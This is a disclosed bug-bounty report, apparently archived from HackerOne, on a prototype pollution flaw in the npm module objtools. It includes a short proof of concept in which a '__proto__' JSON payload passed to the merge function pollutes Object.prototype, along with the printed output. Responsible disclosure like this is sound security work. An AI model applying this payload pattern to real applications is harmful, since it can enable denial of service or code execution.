---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/modification-of-assumed-immutable-data-maid
  - env/web
  - stack/node
  - vuln/code-injection
  - vuln/dos
  - impact/rce
substate: "resolved"
weakness: "Modification of Assumed-Immutable Data (MAID)"
enriched: true
body: true
date: 2020-09-14
submitted: 2020-05-19T21:40:21.546Z
bounty_usd: null
votes: 1
cve: []
program: "[[programs/nodejs-ecosystem|Node.js third-party modules]]"
reporter: "d3lla"
source: "https://hackerone.com/reports/878394"
title: "[objtools] Prototype pollution"
---
# [objtools] Prototype pollution

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 1 | **Program:** Node.js third-party modules | **Disclosed:** 2020-09-14

- Report: [https://hackerone.com/reports/878394](https://hackerone.com/reports/878394)
- CWE: Modification of Assumed-Immutable Data (MAID)
- Submitted: 2020-05-19T21:40:21.546Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

I would like to report a `prototype pollution` vulnerability in `objtools` module.
It allows an attacker to inject properties on Object.prototype.

# Module

**module name:** `objtools`
**version:** `2.0.1`
**npm page:** `https://www.npmjs.com/package/objtools`

## Module Description

objtools provides several utility functions for working with structured objects. Basic examples of how to use are provided below. See the docs directory for full information.

## Module Stats

[30] weekly downloads

# Vulnerability

## Vulnerability Description

The `merge` function can be used to add/modify properties of the Object prototype. These properties will be present on all objects.

## Steps To Reproduce:
- install `objtools` module:
    - `npm i objtools`

Create an object with `__proto__` property and pass it to the `merge` function:
```javascript

const objtools = require('objtools');
const payload = JSON.parse('{"__proto__":{"polluted":"yes"}}');
let obj = {};
console.log("Before : " + obj.polluted);
objtools.merge({}, payload);
console.log("After : " + obj.polluted);
```
Output:
```console

Before : undefined
After : yes
```
{F835153}

## Supporting Material/References:

- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS
- NODEJS VERSION: v14.1.0
- NPM VERSION: 6.14.5

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N] 


Thank you for your time.

best regards,

d3lla

## Impact

The impact depends on the application. In some cases it is possible to achieve Denial of service (DoS), Remote Code Execution, Property Injection.

## Timeline

- **Report Filed**
- **2020-05-19** @nochnoidozor: Hi @d3lla,

Thank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.

Kind regards,
@nochnoidozor
- **Report Triaged**
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
